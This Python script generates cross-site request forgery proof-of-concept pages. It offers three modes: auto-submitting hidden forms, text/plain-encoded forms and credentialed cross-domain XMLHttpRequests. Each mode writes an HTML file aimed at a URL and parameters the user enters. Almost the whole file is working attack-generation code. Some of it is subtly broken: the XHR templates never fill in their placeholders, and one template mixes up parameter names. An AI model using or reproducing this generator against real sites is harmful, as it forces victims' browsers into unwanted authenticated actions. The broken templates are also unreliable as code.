#!/usr/bin/python3

import os
import colorama
from colorama import Fore
from colorama import Back
from colorama import Style

os.system('clear')
colorama.init(autoreset=True)

owner=f'''{Fore.GREEN}
         __        __    _  __        ____      _                ___  
         \ \      / /__ | |/ _|      / ___|   _| |__   ___ _ __ / _ \ 
          \ \ /\ / / _ \| | |_ _____| |  | | | | '_ \ / _ \ '__| | | |
           \ V  V / (_) | |  _|_____| |__| |_| | |_) |  __/ |  | |_| |
            \_/\_/ \___/|_|_|        \____\__, |_.__/ \___|_|   \___/ {Fore.MAGENTA}(@MuhamadAenadin)

'''
CSRFs=f'''{Fore.BLUE}
   ___ ___ ___ ___    ___  ___   ___     ___                       _           
  / __/ __| _ \ __|__| _ \/ _ \ / __|__ / __|___ _ _  ___ _ _ __ _| |_ ___ _ _ 
 | (__\__ \   / _|___|  _/ (_) | (_|___| (_ / -_) ' \/ -_) '_/ _` |  _/ _ \ '_|
  \___|___/_|_\_|    |_|  \___/ \___|   \___\___|_||_\___|_| \__,_|\__\___/_| 
'''

print(owner)
print(CSRFs)

def autoSelect(URL, method, parameter, parameter_1_Value, parameter2, parameter_2_Value):

    if method == 'GET':
        auto_select=f'''
        <html>
        <!-- CSRF-POC-generated by Wolf-Cyber0 -->
            <body>
                <script>history.pushState('', '', '/')</script>
                <form action="{URL}">
                    <input type="hidden" name="{parameter}" value="{parameter_1_Value}" />
                    <input type="hidden" name="{parameter2}" value="{parameter_2_Value}" />
                    <input type="submit" value="Submit request" />
                </form>
                <script>
                    document.forms[0].submit();
                </script>
            </body>
        </html>
        '''
        
        f=open('POC-By-Wolf-Cyber0.html','w')
        f.write(auto_select)
        f.close()
        print(f'{Fore.CYAN}POC file Created :)')
    

    elif method == 'POST':
        auto_selectPOST=f'''
        <html>
        <!-- CSRF-POC-generated by Wolf-Cyber0 -->
            <body>
                <script>history.pushState('', '', '/')</script>
                <form action="{URL}" method="{method}">
                    <input type="hidden" name="{parameter}" value="{parameter_1_Value}" />
                    <input type="hidden" name="{parameter2}" value="{parameter_2_Value}" />
                    <input type="submit" value="Submit request" />
                </form>
                <script>
                    document.forms[0].submit();
                </script>
            </body>
        </html>
        '''
        f=open('POC.html','w')
        f.write(auto_selectPOST)
        f.close()
        print(f'{Fore.CYAN}POC file Created :)')

        
    else :
        print(f'{Fore.RED}only (POST & GET) method is allowed')


def PlainTextForm(URL, method, parameter, parameter_1_Value, parameter2, parameter_2_Value):

    if method == 'GET':
        auto_select=f'''
        <html>
        <!-- CSRF-POC-generated by Wolf-Cyber0 -->
            <body>
                <script>history.pushState('', '', '/')</script>
                <form action="{URL}">
                    <input type="hidden" name="{parameter}" value="{parameter_1_Value}" />
                    <input type="hidden" name="{parameter2}" value="{parameter_2_Value}" />
                    <input type="submit" value="Submit request" />
                </form>
                <script>
                    document.forms[0].submit();
                </script>
            </body>
        </html>
        '''
        
        f=open('POC-By-Wolf-Cyber0.html','w')
        f.write(auto_select)
        f.close()
        print(f'{Fore.CYAN}POC file Created :)')
    

    elif method == 'POST':
        auto_selectPOST=f'''
        <html>
        <!-- CSRF-POC-generated by Wolf-Cyber0 -->
            <body>
                <script>history.pushState('', '', '/')</script>
                <form action="{URL}" method="{method}" enctype="text/plain">
                    <input type="hidden" name="{parameter}" value="{parameter_1_Value}&amp;{parameter2}&#61;{parameter_2_Value}" />
                    <input type="submit" value="Submit request" />
                </form>
                <script>
                    document.forms[0].submit();
                </script>
            </body>
        </html>
        '''
        f=open('POC-By-Wolf-Cyber0.html','w')
        f.write(auto_selectPOST)
        f.close()
        print(f'{Fore.CYAN}POC file Created :)')

        
    else :
        print(f'{Fore.RED}only (POST & GET) method is allowed')


def XHR(URL, method, parameter, parameter_1_Value, parameter2, parameter_2_Value):

    if method == 'POST':
        auto_select='''
            <html>
                <!-- CSRF-POC-Generated by Wolf-Cyber0 -->
                <body>
                    <script>history.pushState('', '', '/')</script>
                    <script>
                        function submitRequest(){
                        var xhr = new XMLHttpRequest();
                        xhr.open("{method}", "{URL}", true);
                        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8");
                        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
                        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
                        xhr.withCredentials = true;
                        var body = "{parameter}={parameter_1_Value}&{parameter2}={parameter_2_Value}";
                        var aBody = new Uint8Array(body.length);
                        for (var i = 0; i < aBody.length; i++)
                        aBody[i] = body.charCodeAt(i); 
                        xhr.send(new Blob([aBody]));
                        }
                        submitRequest();
                    </script>
                    <form action="#">
                        <input type="button" value="Submit request" onclick="submitRequest();" />
                    </form>
                </body>
            </html>
        '''
        
        f=open('POC-By-Wolf-Cyber0.html','w')
        f.write(auto_select)
        f.close()
        print(f'{Fore.CYAN}POC file Created :)')
    

    elif method == 'GET':
        auto_selectPOST='''
            <html>
                <!-- CSRF-POC-Generated by Wolf-Cyber0 -->
                <body>
                 <script>history.pushState('', '', '/')</script>
                  <script>
                    function submitRequest(){
                       var xhr = new XMLHttpRequest();
                      xhr.open("{method}", "{URL}?{Parameter}={parameter_1_value}&{parameter}={parameter_2_Value}", true);
                      xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8");
                        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
                     xhr.withCredentials = true;
                      var body = "";
                      var aBody = new Uint8Array(body.length);
                       for (var i = 0; i < aBody.length; i++)
                         aBody[i] = body.charCodeAt(i); 
                       xhr.send(new Blob([aBody]));
                    }
                    submitRequest();
                    </script>
                    <form action="#">
                      <input type="button" value="Submit request" onclick="submitRequest();" />
                    </form>
                  </body>
            </html>
        '''
        f=open('POC-By-Wolf-Cyber0.html','w')
        f.write(auto_selectPOST)
        f.close()
        print(f'{Fore.CYAN}POC file Created :)')

        
    else :
        print(f'{Fore.RED}only (POST & GET) method is allowed')


print(f'''{Fore.WHITE}
1. Auto-Select 
2. Plain text form
3. Cross-Domain XHR (Modern Browser Only)
''')

chose=int(input('Enter Number : '))

if chose==1:
    print('Working on: Auto-Select')
    print(f'{Fore.RED}Note: Write Email like this ( test&#64;gmail&#46;com )')
    URLInput=input('URL: ')
    methodInput=input('Method: ')
    parameterOneInput=input('Parameter One: ')
    parameterOneValueInput=input('Parameter One Value : ')
    parameterTwoInput=input('Parameter Two : ')
    tokenInput=input('Token Input: ')

    autoSelect(URLInput,methodInput,parameterOneInput,parameterOneValueInput,parameterTwoInput,tokenInput)

elif chose == 2:
    print('Working on: Plain text form')
    print(f'{Fore.RED}Note: Write Email like this ( test&#64;gmail&#46;com )')
    URLInput=input('URL: ')
    methodInput=input('Method: ')
    parameterOneInput=input('Parameter One: ')
    parameterOneValueInput=input('Parameter One Value : ')
    parameterTwoInput=input('Parameter Two : ')
    tokenInput=input('Token Input: ')
    PlainTextForm(URLInput,methodInput,parameterOneInput,parameterOneValueInput,parameterTwoInput,tokenInput)

elif chose == 3:
    print('Working on: Cross-Domain XHR (Modern Browser Only)')
    print('Working on: Plain text form')
    URLInput=input('URL: ')
    methodInput=input('Method: ')
    parameterOneInput=input('Parameter One: ')
    parameterOneValueInput=input('Parameter One Value : ')
    parameterTwoInput=input('Parameter Two : ')
    tokenInput=input('Token Input: ')
    XHR(URLInput,methodInput,parameterOneInput,parameterOneValueInput,parameterTwoInput,tokenInput)

else:
    print(f'{Fore.RED}Not Found :) only number 1,2,3 ')

